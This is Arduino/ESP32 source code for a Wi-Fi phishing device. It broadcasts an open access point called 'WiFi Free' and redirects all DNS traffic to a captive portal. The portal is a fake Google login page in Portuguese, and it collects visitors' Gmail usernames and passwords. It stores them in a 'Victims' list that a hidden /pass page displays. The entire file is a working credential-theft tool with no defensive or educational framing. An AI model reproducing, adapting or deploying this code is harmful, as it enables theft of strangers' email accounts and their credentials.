#include <Arduino.h>
#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "Victims.cpp"


// User configuration
const char* SSID_NAME = "WiFi Free";
const char* SUBTITLE = "Bem Vindo!";
const char* TITLE = "Login:";
const char* BODY = "Entre com seu Google Mail para se conectar a rede.";
const char* POST_TITLE = "Validando...";
const char* POST_BODY = "Sua conta de e-mail está sendo validada. Aguarde até 3 minutos para a conexão do dispositivo.<br>Obrigado.";
const char* PASS_TITLE = "Victims";
const char* CLEAR_TITLE = "Cleared";

//System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const int TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway


unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);
Victims *victims;


String input(String argName) {
    String a = webServer.arg(argName);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    a.substring(0, 200);
    return a;
}

String footer() {
    return "<br><footer><div><center><p>Copyright&#169; 2025 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
    String a = String(SSID_NAME);
    String svg_image = "<?xml version='1.0' ?><svg id='Capa_1' style='enable-background:new 0 0 150 150;' version='1.1' viewBox='0 0 150 150' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><style type='text/css'> .st0{fill:#1A73E8;} .st1{fill:#EA4335;} .st2{fill:#4285F4;} .st3{fill:#FBBC04;} .st4{fill:#34A853;} .st5{fill:#4CAF50;} .st6{fill:#1E88E5;} .st7{fill:#E53935;} .st8{fill:#C62828;} .st9{fill:#FBC02D;} .st10{fill:#1565C0;} .st11{fill:#2E7D32;} .st12{fill:#F6B704;} .st13{fill:#E54335;} .st14{fill:#4280EF;} .st15{fill:#34A353;} .st16{clip-path:url(#SVGID_2_);} .st17{fill:#188038;} .st18{opacity:0.2;fill:#FFFFFF;enable-background:new;} .st19{opacity:0.3;fill:#0D652D;enable-background:new;} .st20{clip-path:url(#SVGID_4_);} .st21{opacity:0.3;fill:url(#_45_shadow_1_);enable-background:new;} .st22{clip-path:url(#SVGID_6_);} .st23{fill:#FA7B17;} .st24{opacity:0.3;fill:#174EA6;enable-background:new;} .st25{opacity:0.3;fill:#A50E0E;enable-background:new;} .st26{opacity:0.3;fill:#E37400;enable-background:new;} .st27{fill:url(#Finish_mask_1_);} .st28{fill:#FFFFFF;} .st29{fill:#0C9D58;} .st30{opacity:0.2;fill:#004D40;enable-background:new;} .st31{opacity:0.2;fill:#3E2723;enable-background:new;} .st32{fill:#FFC107;} .st33{opacity:0.2;fill:#1A237E;enable-background:new;} .st34{opacity:0.2;} .st35{fill:#1A237E;} .st36{fill:url(#SVGID_7_);} .st37{fill:#FBBC05;} .st38{clip-path:url(#SVGID_9_);fill:#E53935;} .st39{clip-path:url(#SVGID_11_);fill:#FBC02D;} .st40{clip-path:url(#SVGID_13_);fill:#E53935;} .st41{clip-path:url(#SVGID_15_);fill:#FBC02D;} </style><g><path class='st14' d='M120,76.1c0-3.1-0.3-6.3-0.8-9.3H75.9v17.7h24.8c-1,5.7-4.3,10.7-9.2,13.9l14.8,11.5 C115,101.8,120,90,120,76.1L120,76.1z'/><path class='st15' d='M75.9,120.9c12.4,0,22.8-4.1,30.4-11.1L91.5,98.4c-4.1,2.8-9.4,4.4-15.6,4.4c-12,0-22.1-8.1-25.8-18.9 L34.9,95.6C42.7,111.1,58.5,120.9,75.9,120.9z'/><path class='st12' d='M50.1,83.8c-1.9-5.7-1.9-11.9,0-17.6L34.9,54.4c-6.5,13-6.5,28.3,0,41.2L50.1,83.8z'/><path class='st13' d='M75.9,47.3c6.5-0.1,12.9,2.4,17.6,6.9L106.6,41C98.3,33.2,87.3,29,75.9,29.1c-17.4,0-33.2,9.8-41,25.3 l15.2,11.8C53.8,55.3,63.9,47.3,75.9,47.3z'/></g></svg>";

    String CSS =  "body { font-family: 'Arial', sans-serif; background: #fff; margin: 0; text-align: center; color: #202124; }"
    "        .container { max-width: 400px; margin: 5% auto; padding: 2rem; background: #fff; border-radius: 8px; box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28); }"
    "        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 1rem; outline: none; }"
    "        input:focus { border-color: #1a73e8; box-shadow: 0 1px 3px rgba(26, 115, 232, 0.2); }"
    "        input[type=submit] { background: #1a73e8; color: white; cursor: pointer; border: none; font-weight: bold; }"
    "        input[type=submit]:hover { background: #1765cc; }"
    "        .label { color: #202124; font-size: 0.9rem; font-weight: bold; display: block; text-align: left; margin-top: 10px; }"
    "        svg { max-width: 100px; height: auto; margin: 10px auto; }";

    String h = "<!DOCTYPE html><html>"
                "<head><title>" + a + " :: " + t + "</title>"
                "<meta name=viewport content=\"width=device-width, initial-scale=1\">"
                "<style>" + CSS + "</style></head>"
                "<body><header><h1>" + a + "</h1><p>" + SUBTITLE + "</p></header>"
                "<div class=\"container\"><h1>" + t + "</h1>" + svg_image;

    return h;
}

String pass() {
    return header(PASS_TITLE) + "<ol>" + victims->returnFullTextFormatted() + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
    return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b class=username-label> Username:   </b> <center> <input type=text name=username placeholder=gmail></center>" +
         "<b class=password-label> Password: </b> <center> <input type=password name=password placeholder=password></center>" +
         "<center><input type=submit value=Login></center></form>" + footer();
}

String posted() {
    String username = input("username");
    String password = input("password");
    victims->addVictim(username, password);
    return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
    victims->clearVictims();
    return header(CLEAR_TITLE) + "<div><p>The Victims list has been cleared.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void setup() {
    bootTime = lastActivity = millis();

    WiFi.mode(WIFI_AP_STA); // Use both AP and STA modes
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(SSID_NAME);

    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

    webServer.on("/post", []() {
        webServer.send(HTTP_CODE, "text/html", posted());
    });

    webServer.on("/pass", []() {
        webServer.send(HTTP_CODE, "text/html", pass());
    });

    webServer.on("/clear", []() {
        webServer.send(HTTP_CODE, "text/html", clear());
    });

    webServer.onNotFound([]() {
        lastActivity = millis();
        webServer.send(HTTP_CODE, "text/html", index());
    });

    webServer.begin();

    Serial.begin(9600);
    victims = new Victims();
}

void loop() {
    if ((millis() - lastTick) > TICK_TIMER) {
        lastTick = millis();
    }
    dnsServer.processNextRequest();
    webServer.handleClient();
}
